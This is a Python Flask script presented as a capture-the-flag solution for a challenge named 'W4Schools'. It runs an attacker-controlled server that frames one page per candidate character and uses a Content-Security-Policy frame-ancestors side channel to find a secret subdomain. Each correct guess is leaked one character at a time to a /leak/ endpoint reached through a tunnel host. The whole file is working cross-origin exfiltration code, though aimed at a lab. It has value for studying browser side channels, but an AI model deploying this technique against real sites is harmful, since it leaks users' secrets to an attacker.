"""

    bubu - Solution for W4Schools
    https://albertofdr.github.io/
    @alberto_fdr

"""

import string
from flask import Flask, request, make_response

app = Flask(__name__)
FLAG = ""

# CHANGE ME
WEB = "web.localhost"
SANDBOX = "http://sandbox.localhost"
# Depending on the tunnel service you use
LEAK = "*.lhr.life"


@app.route('/leak/')
def leak():
    global FLAG
    # Respond with the route as text
    FLAG += request.args.get('char')
    print('---------------------------------------')
    print(f"[LEAK] Flag: {FLAG}")
    print('---------------------------------------')
    return ""


@app.route('/<path:route>')
def catch_all(route):
    FLAG_WEB = f"http://{route}." + WEB
    resp = make_response(f"<html><img src='/leak/?char={route}'></html>")
    resp.headers["Content-Security-Policy"] = f"frame-ancestors {LEAK} {SANDBOX} {FLAG_WEB} ;"
    return resp


@app.route('/')
def index():
    resp = "<html>"
    for char in string.ascii_lowercase + string.digits:
        resp += f"<iframe src='/{char}'></iframe>"

    # Only one letter
    # resp += f"<iframe src='/f'></iframe>"
    resp += "</html>"
    resp = make_response(resp)
    return resp


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=4444, debug=False)
